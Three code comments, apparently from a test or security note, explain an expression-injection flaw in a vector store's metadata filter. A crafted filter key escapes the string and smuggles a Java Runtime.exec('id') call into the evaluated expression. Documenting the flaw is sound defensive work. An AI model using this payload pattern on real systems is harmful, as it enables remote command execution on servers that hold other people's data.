// SimpleVectorStore evaluates: #metadata['<filterKey>'] == '<filterValue>'
// filterKey = "'] + T(java.lang.Runtime).getRuntime().exec('id') + #metadata['"
// Results in: #metadata[''] + Runtime.exec('id') + #metadata[''] == 'x'
